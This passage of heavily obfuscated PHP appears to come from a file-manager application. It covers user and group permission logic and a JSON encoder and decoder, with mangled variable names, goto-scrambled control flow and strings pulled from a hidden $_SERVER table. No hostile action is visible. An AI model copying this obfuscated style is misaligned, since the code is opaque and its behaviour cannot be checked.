$CšÕ°¢…») { $f»Œˆ†ÛÖó = $this->authInfo($CšÕ°¢…»); if ($CšÕ°¢…»[$FË¢Óì¢[469]] == $FË¢Óì¢[481]) { $D§ò…ºÀÑ = !0; } if ($CšÕ°¢…»[$FË¢Óì¢[383]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($f»Œˆ†ÛÖó[$FË¢Óì¢[388]])) { $fÕ°åÆÓÇ[] = $CšÕ°¢…»[$FË¢Óì¢[469]]; } } } return array($FË¢Óì¢[547] => $fÕ°åÆÓÇ, $FË¢Óì¢[2306] => $D§ò…ºÀÑ); } public function authMake($bÛÑÓÖ¦º„, $b„×æğÛ· = false) { goto FíÊœ¤Š; FíÊœ¤Š: $A¥õ¤Š‰† =& $_SERVER[‡’¶øåüç˜]; if (!$bÛÑÓÖ¦º„) { return array($A¥õ¤Š‰†[389] => 0, $A¥õ¤Š‰†[430] => !1); } $b„×æğÛ· = $b„×æğÛ· ? $b„×æğÛ· : USER_ID; goto EØ¬‰Úà°ñ; EØ¬‰Úà°ñ: $fÍæÌÅ›Îå = 0; $a¤æä®’Ø“ = 0; $e©±ĞôÒ“ = 0; goto eˆ‚ôÖ°Ÿğ; cá¦¾»ˆœñ: $C¶ø´¿­¶ = 1000; $a¼ƒÌ­’äñ = 0; $eÑ¶§•òâá = 0; goto dÊÍÌ‹‡…»; c¬Å´÷„Ãö: foreach ($bÛÑÓÖ¦º„ as $D²‚½£êù¸) { $b„­“ô¹ğË = $this->authInfo($D²‚½£êù¸); $dÕ‘À’Üß = $D²‚½£êù¸[$A¥õ¤Š‰†[469]]; $aÂ ×–Ë = intval($b„­“ô¹ğË[$A¥õ¤Š‰†[388]]); if ($D²‚½£êù¸[$A¥õ¤Š‰†[383]] == SourceModel::TYPE_USER && $dÕ‘À’Üß == $b„×æğÛ·) { $fÍæÌÅ›Îå = !0; $e©±ĞôÒ“ = $b„­“ô¹ğË; $a¤æä®’Ø“ = $aÂ ×–Ë; } else { if ($D²‚½£êù¸[$A¥õ¤Š‰†[383]] == SourceModel::TYPE_GROUP && $this->groupContainUser($dÕ‘À’Üß, $b„×æğÛ·)) { $A¥ÅÎ…õ†¹ = !0; $B‡ÒÑ‹œ´İ = $this->groupStepToUserGroup($dÕ‘À’Üß, $b„×æğÛ·); if ($B‡ÒÑ‹œ´İ < $C¶ø´¿­¶) { $C¶ø´¿­¶ = $B‡ÒÑ‹œ´İ; $AµîÇˆƒ¾Æ = $aÂ ×–Ë; $A¬§–ØÀ©© = $b„­“ô¹ğË; $a¼ƒÌ­’äñ = $dÕ‘À’Üß; } if ($B‡ÒÑ‹œ´İ == $C¶ø´¿­¶ && $aÂ ×–Ë >= $AµîÇˆƒ¾Æ) { $AµîÇˆƒ¾Æ = $aÂ ×–Ë; $A¬§–ØÀ©© = $b„­“ô¹ğË; $a¼ƒÌ­’äñ = $dÕ‘À’Üß; } } else { if ($dÕ‘À’Üß == $A¥õ¤Š‰†[481]) { $eÑ¶§•òâá = !0; $cÅºò¯½Œ¸ = $b„­“ô¹ğË; $E‘”†šÖË = $aÂ ×–Ë; } } } } if ($fÍæÌÅ›Îå) { $B­ÏŞ‰„ŒÂ = $a¤æä®’Ø“; $b„­“ô¹ğË = $e©±ĞôÒ“; $D¡ÖÃöá¹ = LNG($A¥õ¤Š‰†[2308]); } else { if ($A¥ÅÎ…õ†¹) { $B­ÏŞ‰„ŒÂ = $AµîÇˆƒ¾Æ; $b„­“ô¹ğË = $A¬§–ØÀ©©; $bé¾‹§®‰ = Model($A¥õ¤Š‰†[471])->getInfo($a¼ƒÌ­’äñ); $D¡ÖÃöá¹ = $A¥õ¤Š‰†[157] . $bé¾‹§®‰[$A¥õ¤Š‰†[476]] . $A¥õ¤Š‰†[2309] . LNG($A¥õ¤Š‰†[2310]); } else { if ($eÑ¶§•òâá) { $B­ÏŞ‰„ŒÂ = $E‘”†šÖË; $b„­“ô¹ğË = $cÅºò¯½Œ¸; $D¡ÖÃöá¹ = LNG($A¥õ¤Š‰†[2280]); } else { $B­ÏŞ‰„ŒÂ = 0; $b„­“ô¹ğË = !1; $D¡ÖÃöá¹ = $A¥õ¤Š‰†[33]; } } } $F¶²‘Šïƒƒ = array($A¥õ¤Š‰†[2301] => intval($B­ÏŞ‰„ŒÂ), $A¥õ¤Š‰†[2284] => $b„­“ô¹ğË, $A¥õ¤Š‰†[2302] => $D¡ÖÃöá¹, $A¥õ¤Š‰†[2293] => $this->sourceAuthInfo($D²‚½£êù¸[$A¥õ¤Š‰†[381]])); goto Eã«¹—ƒİİ; eˆ‚ôÖ°Ÿğ: $A¥ÅÎ…õ†¹ = 0; $AµîÇˆƒ¾Æ = 0; $A¬§–ØÀ©© = 0; goto cá¦¾»ˆœñ; dÊÍÌ‹‡…»: $E‘”†šÖË = 0; $cÅºò¯½Œ¸ = 0; $D²‚½£êù¸ = array($A¥õ¤Š‰†[381] => 0); goto c¬Å´÷„Ãö; Eã«¹—ƒİİ: return $F¶²‘Šïƒƒ; goto e¡Ş®ßÒŒã; e¡Ş®ßÒŒã: } private function groupContainUser($eÂ‚¿è–â, $F¾ëÇàß«ö = false) { return in_array($eÂ‚¿è–â, $this->userGroupParents($F¾ëÇàß«ö)); } private function groupStepToUserGroup($a”¦„àäÅì, $aÚêõî®ØÒ = false) { goto cóÉÃæÜö; a´›ø”ø‰: $eÒ„Š½¡¡ = $GLOBALS[$AĞõ×ÈŒÈ[6]][$AĞõ×ÈŒÈ[84]][$AĞõ×ÈŒÈ[2203]] == 1; $bÑÄÉÔÔ‚ = $eÒ„Š½¡¡ ? 3 : 2; foreach ($eà÷ğŠ‚ùù as $B Š¯’ŞÜ) { if ($B Š¯’ŞÜ[$AĞõ×ÈŒÈ[2112]] == $a”¦„àäÅì) { return 0; } $d§×µ…òÀÌ = explode($AĞõ×ÈŒÈ[47], trim($B Š¯’ŞÜ[$AĞõ×ÈŒÈ[472]], $AĞõ×ÈŒÈ[47])); if ($d§×µ…òÀÌ[0] == $AĞõ×ÈŒÈ[481] && count($d§×µ…òÀÌ) > $bÑÄÉÔÔ‚) { $b Ëò“à‚ = array_reverse(array_slice($d§×µ…òÀÌ, $bÑÄÉÔÔ‚)); $dŸ¸ÎË¨Ğ = array_search($a”¦„àäÅì, $b Ëò“à‚); if ($dŸ¸ÎË¨Ğ !== !1 && $dŸ¸ÎË¨Ğ + 1 <= $fÎÏ¹ğÎ†à) { $fÎÏ¹ğÎ†à = $dŸ¸ÎË¨Ğ + 1; } } } goto B•Ã»‹áê¼; B•Ã»‹áê¼: return $fÎÏ¹ğÎ†à; goto b¶Î–ŠÂ¤õ; cóÉÃæÜö: $AĞõ×ÈŒÈ =& $_SERVER[‡’¶øåüç˜]; $eà÷ğŠ‚ùù = $this->userGroupList($aÚêõî®ØÒ); $fÎÏ¹ğÎ†à = 1000; goto a´›ø”ø‰; b¶Î–ŠÂ¤õ: } private function userGroupList($aÚ£¼¿å· = false) { $cç¤ŠÀ‹ô† =& $_SERVER[‡’¶øåüç˜]; static $DÃµ¯ğŠ—÷ = array(); if (isset($DÃµ¯ğŠ—÷[$aÚ£¼¿å·])) { return $DÃµ¯ğŠ—÷[$aÚ£¼¿å·]; } $CÔ¼Š¤¼Éé = Model($cç¤ŠÀ‹ô†[490])->getInfo($aÚ£¼¿å·); $DÃµ¯ğŠ—÷[$aÚ£¼¿å·] = array_to_keyvalue($CÔ¼Š¤¼Éé[$cç¤ŠÀ‹ô†[2281]], $cç¤ŠÀ‹ô†[2112]); return $DÃµ¯ğŠ—÷[$aÚ£¼¿å·]; } public function userGroupParents($bÓ™Ä“Ï) { goto c‘…ä‹¥; d„Ì´“Ìõ¾: $d†´èƒÌÀ…[$bÓ™Ä“Ï] = array_unique($cøæ›í¶º); return $d†´èƒÌÀ…[$bÓ™Ä“Ï]; goto dà¹Ã‰Àğ½; c‘…ä‹¥: $fÃç“Å«¶¹ =& $_SERVER[‡’¶øåüç˜]; static $d†´èƒÌÀ… = array(); $bÓ™Ä“Ï = $bÓ™Ä“Ï ? $bÓ™Ä“Ï : USER_ID; goto Fƒãë”Â‰; Fƒãë”Â‰: if (isset($d†´èƒÌÀ…[$bÓ™Ä“Ï])) { return $d†´èƒÌÀ…[$bÓ™Ä“Ï]; } $CŒî¬Ş—ŒÚ = $this->userGroupList($bÓ™Ä“Ï); $cøæ›í¶º = array(); goto bİ°Ïô•Ë´; bİ°Ïô•Ë´: $A¸ÏÊ‡‡Ÿ = $GLOBALS[$fÃç“Å«¶¹[6]][$fÃç“Å«¶¹[84]][$fÃç“Å«¶¹[2203]] == 1; $B®†¥”²Ó„ = $A¸ÏÊ‡‡Ÿ ? 3 : 2; foreach ($CŒî¬Ş—ŒÚ as $dİñÍ¿õÉ·) { $d ¯•ëåŠæ = array($dİñÍ¿õÉ·[$fÃç“Å«¶¹[2112]]); $d§Š¨«ØˆÃ = explode($fÃç“Å«¶¹[47], trim($dİñÍ¿õÉ·[$fÃç“Å«¶¹[472]], $fÃç“Å«¶¹[47])); if ($d§Š¨«ØˆÃ[0] == $fÃç“Å«¶¹[481] && count($d§Š¨«ØˆÃ) > $B®†¥”²Ó„) { $böÄ´Ñêâ² = array_slice($d§Š¨«ØˆÃ, $B®†¥”²Ó„); $d ¯•ëåŠæ = array_merge($d ¯•ëåŠæ, array_reverse($böÄ´Ñêâ²)); } $cøæ›í¶º = array_merge($cøæ›í¶º, $d ¯•ëåŠæ); } goto d„Ì´“Ìõ¾; dà¹Ã‰Àğ½: } public function authTargetInfoMake($f†èò´ÁªŠ) { goto eê›¾ÏÖ§; a¶‹Ş¹…¢›: foreach ($f†èò´ÁªŠ as $EŒÌ±å©İ–) { if ($EŒÌ±å©İ–[$E•¿†˜‘ì[383]] == SourceModel::TYPE_USER) { $dâ–Şò˜­¸[] = intval($EŒÌ±å©İ–[$E•¿†˜‘ì[469]]); } else { if ($EŒÌ±å©İ–[$E•¿†˜‘ì[383]] == SourceModel::TYPE_GROUP) { $D¾¾Å„ÚÎ¶[] = intval($EŒÌ±å©İ–[$E•¿†˜‘ì[469]]); } } } if ($dâ–Şò˜­¸) { $dâ–Şò˜­¸ = Model($E•¿†˜‘ì[487])->userListInfo($dâ–Şò˜­¸); } if ($D¾¾Å„ÚÎ¶) { $B¾§†„ÕŞâ = array($E•¿†˜‘ì[2189] => array($E•¿†˜‘ì[396], $D¾¾Å„ÚÎ¶)); $D¾¾Å„ÚÎ¶ = Model($E•¿†˜‘ì[471])->field($E•¿†˜‘ì[2202])->where($B¾§†„ÕŞâ)->select(); $D¾¾Å„ÚÎ¶ = array_to_keyvalue($D¾¾Å„ÚÎ¶, $E•¿†˜‘ì[2112]); } goto DÜ ÎÓ­ÂŸ; DÜ ÎÓ­ÂŸ: return array($E•¿†˜‘ì[2311] => $dâ–Şò˜­¸, $E•¿†˜‘ì[2312] => $D¾¾Å„ÚÎ¶); goto fºˆà­ì¤; eê›¾ÏÖ§: $E•¿†˜‘ì =& $_SERVER[‡’¶øåüç˜]; $dâ–Şò˜­¸ = array(); $D¾¾Å„ÚÎ¶ = array(); goto a¶‹Ş¹…¢›; fºˆà­ì¤: } public function authInfo($Bë‰†‡²ÀÈ) { $d¦ê¥¤ÓÏŠ =& $_SERVER[‡’¶øåüç˜]; if ($Bë‰†‡²ÀÈ[$d¦ê¥¤ÓÏŠ[2256]]) { $F³Ò×Â¢£¾ = Model($d¦ê¥¤ÓÏŠ[2275])->listData($Bë‰†‡²ÀÈ[$d¦ê¥¤ÓÏŠ[2256]]); if (!$F³Ò×Â¢£¾) { return !1; $dØ‚ƒì™øï = Model($d¦ê¥¤ÓÏŠ[2275])->listData(); $aà®ÁëÒ‚ = array_filter_by_field($dØ‚ƒì™øï, $d¦ê¥¤ÓÏŠ[388], $d¦ê¥¤ÓÏŠ[481]); return $aà®ÁëÒ‚; } $CŠÜ†×Íé = array_field_key($F³Ò×Â¢£¾, array($d¦ê¥¤ÓÏŠ[371], $d¦ê¥¤ÓÏŠ[28], $d¦ê¥¤ÓÏŠ[388], $d¦ê¥¤ÓÏŠ[2132], $d¦ê¥¤ÓÏŠ[2134])); $CŠÜ†×Íé[$d¦ê¥¤ÓÏŠ[2313]] = $Bë‰†‡²ÀÈ; return $CŠÜ†×Íé; } else { return array($d¦ê¥¤ÓÏŠ[397] => 0, $d¦ê¥¤ÓÏŠ[2118] => $Bë‰†‡²ÀÈ[$d¦ê¥¤ÓÏŠ[2257]], $d¦ê¥¤ÓÏŠ[398] => $d¦ê¥¤ÓÏŠ[33], $d¦ê¥¤ÓÏŠ[2132] => $d¦ê¥¤ÓÏŠ[2314]); } } } goto BËîŞÑ¹êƒ; B‚ÛŠÙç¬: define($_SERVER[‡’¶øåüç˜][1944], 16); define($_SERVER[‡’¶øåüç˜][1945], 32); class Services_JSON { function __construct($d¿‰è½íÔ˜ = 0) { $this->use = $d¿‰è½íÔ˜; } function utf162utf8($CäùŒ­ŞŒÀ) { $a…ÆÃ¡ªĞ¹ =& $_SERVER[‡’¶øåüç˜]; if (function_exists($a…ÆÃ¡ªĞ¹[68])) { return mb_convert_encoding($CäùŒ­ŞŒÀ, $a…ÆÃ¡ªĞ¹[1594], $a…ÆÃ¡ªĞ¹[1946]); } $E¥‰õªš‘Ó = ord($CäùŒ­ŞŒÀ[0]) << 8 | ord($CäùŒ­ŞŒÀ[1]); switch (!0) { case (127 & $E¥‰õªš‘Ó) == $E¥‰õªš‘Ó: return chr(127 & $E¥‰õªš‘Ó); case (2047 & $E¥‰õªš‘Ó) == $E¥‰õªš‘Ó: return chr(192 | $E¥‰õªš‘Ó >> 6 & 31) . chr(128 | $E¥‰õªš‘Ó & 63); case (65535 & $E¥‰õªš‘Ó) == $E¥‰õªš‘Ó: return chr(224 | $E¥‰õªš‘Ó >> 12 & 15) . chr(128 | $E¥‰õªš‘Ó >> 6 & 63) . chr(128 | $E¥‰õªš‘Ó & 63); } return $a…ÆÃ¡ªĞ¹[33]; } function utf82utf16($fÕ¶©²òã˜) { $AÒ¶†‘ =& $_SERVER[‡’¶øåüç˜]; if (function_exists($AÒ¶†‘[68])) { return mb_convert_encoding($fÕ¶©²òã˜, $AÒ¶†‘[1946], $AÒ¶†‘[1594]); } switch (strlen($fÕ¶©²òã˜)) { case 1: return $fÕ¶©²òã˜; case 2: return chr(7 & ord($fÕ¶©²òã˜[0]) >> 2) . chr(192 & ord($fÕ¶©²òã˜[0]) << 6 | 63 & ord($fÕ¶©²òã˜[1])); case 3: return chr(240 & ord($fÕ¶©²òã˜[0]) << 4 | 15 & ord($fÕ¶©²òã˜[1]) >> 2) . chr(192 & ord($fÕ¶©²òã˜[1]) << 6 | 127 & ord($fÕ¶©²òã˜[2])); } return $AÒ¶†‘[33]; } function encode($cêàæÅ‹İ–) { $cªÆµ¬Òé =& $_SERVER[‡’¶øåüç˜]; switch (gettype($cêàæÅ‹İ–)) { case $cªÆµ¬Òé[1605]: return $cêàæÅ‹İ– ? $cªÆµ¬Òé[1604] : $cªÆµ¬Òé[1606]; case $cªÆµ¬Òé[1947]: return $cªÆµ¬Òé[99]; case $cªÆµ¬Òé[307]: return (int) $cêàæÅ‹İ–; case $cªÆµ¬Òé[282]: case $cªÆµ¬Òé[281]: return (double) $cêàæÅ‹İ–; case $cªÆµ¬Òé[316]: $F•éŸ¶Şİ = $cªÆµ¬Òé[33]; $fğöæŠ‡Û® = strlen($cêàæÅ‹İ–); for ($B‘ÜæÖŸÓœ = 0; $B‘ÜæÖŸÓœ < $fğöæŠ‡Û®; ++$B‘ÜæÖŸÓœ) { $FëºˆÀÚá = ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ]); switch (!0) { case $FëºˆÀÚá == 8: $F•éŸ¶Şİ .= $cªÆµ¬Òé[1948]; break; case $FëºˆÀÚá == 9: $F•éŸ¶Şİ .= $cªÆµ¬Òé[1581]; break; case $FëºˆÀÚá == 10: $F•éŸ¶Şİ .= $cªÆµ¬Òé[1579]; break; case $FëºˆÀÚá == 12: $F•éŸ¶Şİ .= $cªÆµ¬Òé[1949]; break; case $FëºˆÀÚá == 13: $F•éŸ¶Şİ .= $cªÆµ¬Òé[1580]; break; case $FëºˆÀÚá == 34: case $FëºˆÀÚá == 47: case $FëºˆÀÚá == 92: $F•éŸ¶Şİ .= $cªÆµ¬Òé[93] . $cêàæÅ‹İ–[$B‘ÜæÖŸÓœ]; break; case $FëºˆÀÚá >= 32 && $FëºˆÀÚá <= 127: $F•éŸ¶Şİ .= $cêàæÅ‹İ–[$B‘ÜæÖŸÓœ]; break; case ($FëºˆÀÚá & 224) == 192: $b©¹ôìÕøˆ = pack($cªÆµ¬Òé[1950], $FëºˆÀÚá, ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 1])); $B‘ÜæÖŸÓœ += 1; $FÊ«ñÍò¹÷ = $this->utf82utf16($b©¹ôìÕøˆ); $F•éŸ¶Şİ .= sprintf($cªÆµ¬Òé[1951], bin2hex($FÊ«ñÍò¹÷)); break; case ($FëºˆÀÚá & 240) == 224: $b©¹ôìÕøˆ = pack($cªÆµ¬Òé[1950], $FëºˆÀÚá, ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 1]), ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 2])); $B‘ÜæÖŸÓœ += 2; $FÊ«ñÍò¹÷ = $this->utf82utf16($b©¹ôìÕøˆ); $F•éŸ¶Şİ .= sprintf($cªÆµ¬Òé[1951], bin2hex($FÊ«ñÍò¹÷)); break; case ($FëºˆÀÚá & 248) == 240: $b©¹ôìÕøˆ = pack($cªÆµ¬Òé[1950], $FëºˆÀÚá, ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 1]), ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 2]), ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 3])); $B‘ÜæÖŸÓœ += 3; $FÊ«ñÍò¹÷ = $this->utf82utf16($b©¹ôìÕøˆ); $F•éŸ¶Şİ .= sprintf($cªÆµ¬Òé[1951], bin2hex($FÊ«ñÍò¹÷)); break; case ($FëºˆÀÚá & 252) == 248: $b©¹ôìÕøˆ = pack($cªÆµ¬Òé[1950], $FëºˆÀÚá, ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 1]), ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 2]), ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 3]), ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 4])); $B‘ÜæÖŸÓœ += 4; $FÊ«ñÍò¹÷ = $this->utf82utf16($b©¹ôìÕøˆ); $F•éŸ¶Şİ .= sprintf($cªÆµ¬Òé[1951], bin2hex($FÊ«ñÍò¹÷)); break; case ($FëºˆÀÚá & 254) == 252: $b©¹ôìÕøˆ = pack($cªÆµ¬Òé[1950], $FëºˆÀÚá, ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 1]), ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 2]), ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 3]), ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 4]), ord($cêàæÅ‹İ–[$B‘ÜæÖŸÓœ + 5])); $B‘ÜæÖŸÓœ += 5; $FÊ«ñÍò¹÷ = $this->utf82utf16($b©¹ôìÕøˆ); $F•éŸ¶Şİ .= sprintf($cªÆµ¬Òé[1951], bin2hex($FÊ«ñÍò¹÷)); break; } } return $cªÆµ¬Òé[113] . $F•éŸ¶Şİ . $cªÆµ¬Òé[113]; case $cªÆµ¬Òé[1952]: if (is_array($cêàæÅ‹İ–) && count($cêàæÅ‹İ–) && array_keys($cêàæÅ‹İ–) !== range(0, sizeof($cêàæÅ‹İ–) - 1)) { $dÊ™‰İÇà = array_map(array($this, $cªÆµ¬Òé[1953]), array_keys($cêàæÅ‹İ–), array_values($cêàæÅ‹İ–)); foreach ($dÊ™‰İÇà as $a¥–šÓãÇ‘) { if (Services_JSON::isError($a¥–šÓãÇ‘)) { return $a¥–šÓãÇ‘; } } return $cªÆµ¬Òé[1075] . join($cªÆµ¬Òé[47], $dÊ™‰İÇà) . $cªÆµ¬Òé[319]; } $B’„—Ô½‹Å = array_map(array($this, $cªÆµ¬Òé[1954]), $cêàæÅ‹İ–); foreach ($B’„—Ô½‹Å as $féŠŸ‡ô¦) { if (Services_JSON::isError($féŠŸ‡ô¦)) { return $féŠŸ‡ô¦; } } return $cªÆµ¬Òé[157] . join($cªÆµ¬Òé[47], $B’„—Ô½‹Å) . $cªÆµ¬Òé[489]; case $cªÆµ¬Òé[1955]: $e±ùë³‘ß· = get_object_vars($cêàæÅ‹İ–); $dÊ™‰İÇà = array_map(array($this, $cªÆµ¬Òé[1953]), array_keys($e±ùë³‘ß·), array_values($e±ùë³‘ß·)); foreach ($dÊ™‰İÇà as $a¥–šÓãÇ‘) { if (Services_JSON::isError($a¥–šÓãÇ‘)) { return $a¥–šÓãÇ‘; } } return $cªÆµ¬Òé[1075] . join($cªÆµ¬Òé[47], $dÊ™‰İÇà) . $cªÆµ¬Òé[319]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $cªÆµ¬Òé[99] : new Services_JSON_Error(gettype($cêàæÅ‹İ–) . $cªÆµ¬Òé[1956]); } } function name_value($fó¹æÁŒÖÍ, $F‡ù•ŞˆË©) { $A…ÜñÛŠÏ = $this->encode($F‡ù•ŞˆË©); if (Services_JSON::isError($A…ÜñÛŠÏ)) { return $A…ÜñÛŠÏ; } return $this->encode(strval($fó¹æÁŒÖÍ)) . $_SERVER[‡’¶øåüç˜][4] . $A…ÜñÛŠÏ; } function reduce_string($DãÊÚ“Í) { $c¼”îÎ»Ÿ‰ =& $_SERVER[‡’¶øåüç˜]; $DãÊÚ“Í = preg_replace(array($c¼”îÎ»Ÿ‰[1957], $c¼”îÎ»Ÿ‰[1958], $c¼”îÎ»Ÿ‰[1959]), $c¼”îÎ»Ÿ‰[33], $DãÊÚ“Í); return trim($DãÊÚ“Í); } function decode($CŒà®ùÒù) { $F™Ëõ–Í =& $_SERVER[‡’¶øåüç˜]; $CŒà®ùÒù = $this->reduce_string($CŒà®ùÒù); switch (strtolower($CŒà®ùÒù)) { case $F™Ëõ–Í[1604]: return !0; case $F™Ëõ–Í[1606]: return !1; case $F™Ëõ–Í[99]: return null; default: $cáó†«¤ÜÁ = array(); if (is_numeric($CŒà®ùÒù)) { return (double) $CŒà®ùÒù == (int) $CŒà®ùÒù ? (int) $CŒà®ùÒù : (double) $CŒà®ùÒù; } elseif (preg_match($F™Ëõ–Í[1960], $CŒà®ùÒù, $cáó†«¤ÜÁ) && $cáó†«¤ÜÁ[1] == $cáó†«¤ÜÁ[2]) { $a°¥¡îóÙ = substr($CŒà®ùÒù, 0, 1); $eŠÂ÷ïÖô = substr($CŒà®ùÒù, 1, -1); $Cä²ÕŠ²ïá = $F™Ëõ–Í[33]; $AŒ²Ìˆµéó = strlen($eŠÂ÷ïÖô); for ($B™Ü·Ç˜“Ê = 0; $B™Ü·Ç˜“Ê < $AŒ²Ìˆµéó; ++$B™Ü·Ç˜“Ê) { $dİ‡™Ø“œè = substr($eŠÂ÷ïÖô, $B™Ü·Ç˜“Ê, 2); $Eºï¹ãŸ‡ƒ = ord($eŠÂ÷ïÖô[$B™Ü·Ç˜“Ê]); switch (!0) { case $dİ‡™Ø“œè == $F™Ëõ–Í[1948]: $Cä²ÕŠ²ïá .= chr(8); ++$B™Ü·Ç˜“Ê; break; case $dİ‡™Ø“œè == $F™Ëõ–Í[1581]: $Cä²ÕŠ²ïá .= chr(9); ++$B™Ü·Ç˜“Ê; break; case $dİ‡™Ø“œè == $F™Ëõ–Í[1579]: $Cä²ÕŠ²ïá .= chr(10); ++$B™Ü·Ç˜“Ê; break; case $dİ‡™Ø“œè == $F™Ëõ–Í[1949]: $Cä²ÕŠ²ïá .= chr(12); ++$B™Ü·Ç˜“Ê; break; case $dİ‡™Ø“œè == $F™Ëõ–Í[1580]: $Cä²ÕŠ²ïá .= chr(13); ++$B™Ü·Ç˜“Ê; break; case $dİ‡™Ø“œè == $F™Ëõ–Í[1362]: case $dİ‡™Ø“œè == $F™Ëõ–Í[1961]: case $dİ‡™Ø“œè == $F™Ëõ–Í[1574]: case $dİ‡™Ø“œè == $F™Ëõ–Í[1576]: if ($a°¥¡îóÙ == $F™Ëõ–Í[113] && $dİ‡™Ø“œè != $F™Ëõ–Í[1961] || $a°¥¡îóÙ == $F™Ëõ–Í[55] && $dİ‡™Ø“œè != $F™Ëõ–Í[1362]) { $Cä²ÕŠ²ïá .= $eŠÂ÷ïÖô[++$B™Ü·Ç˜“Ê]; } break; case preg_match($F™Ëõ–Í[1962], substr($eŠÂ÷ïÖô, $B™Ü·Ç˜“Ê, 6)): $eâÄ¡ÄÒâø = chr(hexdec(substr($eŠÂ÷ïÖô, $B™Ü·Ç˜“Ê + 2, 2))) . chr(hexdec(substr($eŠÂ÷ïÖô, $B™Ü·Ç˜“Ê + 4, 2))); $Cä²ÕŠ²ïá .= $this->utf162utf8($eâÄ¡ÄÒâø); $B™Ü·Ç˜“Ê += 5; break; case $Eºï¹ãŸ‡ƒ >= 32 && $Eºï¹ãŸ‡ƒ <= 127: $Cä²ÕŠ²ïá .= $eŠÂ÷ïÖô[$B™Ü·Ç˜“Ê]; break; case ($Eºï¹ãŸ‡ƒ & 224) == 192: $Cä²ÕŠ²ïá .= substr($eŠÂ÷ïÖô, $B™Ü·Ç˜“Ê, 2); ++$B™Ü·Ç˜“Ê; break; case ($Eºï¹ãŸ‡ƒ & 240) == 224: $Cä²ÕŠ²ïá .= substr($eŠÂ÷ïÖô, $B™Ü·Ç˜“Ê, 3); $B™Ü·Ç˜“Ê += 2; break; case ($Eºï¹ãŸ‡ƒ & 248) == 240: $Cä²ÕŠ²ïá .= substr($eŠÂ÷ïÖô, $B™Ü·Ç˜“Ê, 4); $B™Ü·Ç˜“Ê += 3; break; case ($Eºï¹ãŸ‡ƒ & 252) == 248: $Cä²ÕŠ²ïá .= substr($eŠÂ÷ïÖô, $B™Ü·Ç˜“Ê, 5); $B™Ü·Ç˜“Ê += 4; break; case ($Eºï¹ãŸ‡ƒ & 254) == 252: $Cä²ÕŠ²ïá .= substr($eŠÂ÷ïÖô, $B™Ü·Ç˜“Ê, 6); $B™Ü·Ç˜“Ê += 5; break; } } return $Cä²ÕŠ²ïá; } elseif (preg_match($F™Ëõ–Í[1963], $CŒà®ùÒù) || preg_match($F™Ëõ–Í[1964], $CŒà®ùÒù)) { goto bŞçôÙ‚½¸; AŸšî‡…Ò˜: $eŠÂ÷ïÖô = $this->reduce_string($eŠÂ÷ïÖô); if ($eŠÂ÷ïÖô == $F™Ëõ–Í[33]) { if (reset($f“­ÎííÇ) == SERVICES_JSON_IN_ARR) { return $e“˜ë©…¯œ; } else { return $f”º—…«—…; } } $AŒ²Ìˆµéó = strlen($eŠÂ÷ïÖô); goto D‚öµ¼Œ£; D‚öµ¼Œ£: for ($B™Ü·Ç˜“Ê = 0; $B™Ü·Ç˜“Ê <= $AŒ²Ìˆµéó; ++$B™Ü·Ç˜“Ê) { $B±•ÑÔ­†î = end($f“­ÎííÇ); $dİ‡™Ø“œè = substr($eŠÂ÷ïÖô, $B™Ü·Ç˜“Ê, 2); if ($B™Ü·Ç˜“Ê == $AŒ²Ìˆµéó || $eŠÂ÷ïÖô[$B™Ü·Ç˜“Ê] == $F™Ëõ–Í[47] && $B±•ÑÔ­†î[$F™Ëõ–Í[1965]] == SERVICES_JSON_SLICE) { $a•°‘‹ô°ê = substr($eŠÂ÷ïÖô, $B±•ÑÔ­†î[$F™Ëõ–Í[267]], $B™Ü·Ç˜“Ê - $B±•ÑÔ­†î[$F™Ëõ–Í[267]]); array_push($f“­ÎííÇ, array($F™Ëõ–Í[1965] => SERVICES_JSON_SLICE, $F™Ëõ–Í[267] => $B™Ü·Ç˜“Ê + 1, $F™Ëõ–Í[1966] => !1)); if (reset($f“­ÎííÇ) == SERVICES_JSON_IN_ARR) { array_push($e“˜ë©…¯œ, $this->decode($a•°‘‹ô°ê)); } elseif (reset($f“­ÎííÇ) == SERVICES_JSON_IN_OBJ) { $fÖèÓõ«¼„ = array(); if (preg_match($F™Ëõ–Í[1967], $a•°‘‹ô°ê, $fÖèÓõ«¼„)) { $BÉ¸ÜØæÅ = $this->decode($fÖèÓõ«¼„[1]); $fÍ‰ï–Ì»‡ = $this->decode($fÖèÓõ«¼„[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f”º—…«—…[$BÉ¸ÜØæÅ] = $fÍ‰ï–Ì»‡; } else { $f”º—…«—…->{$BÉ¸ÜØæÅ} = $fÍ‰ï–Ì»‡; } } elseif (preg_match($F™Ëõ–Í[1968], $a•°‘‹ô°ê, $fÖèÓõ«¼„)) { $BÉ¸ÜØæÅ = $fÖèÓõ«¼„[1]; $fÍ‰ï–Ì»‡ = $this->decode($fÖèÓõ«¼„[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $f”º—…«—…[$BÉ¸ÜØæÅ] = $fÍ‰ï–Ì»‡; } else { $f”º—…«—…->{$BÉ¸ÜØæÅ} = $fÍ‰ï–Ì»‡; } } } } elseif (($eŠÂ÷ïÖô[$B™Ü·Ç˜“Ê] == $F™Ëõ–Í[113] || $eŠÂ÷ïÖô[$B™Ü·Ç˜“Ê] == $F™Ëõ–Í[55]) && $B±•ÑÔ­†î[$F™Ëõ–Í[1965]] != SERVICES_JSON_IN_STR) { array_push($f“­ÎííÇ, array($F™Ëõ–Í[1965] => SERVICES_JSON_IN_STR, $F™Ëõ–Í[267] => 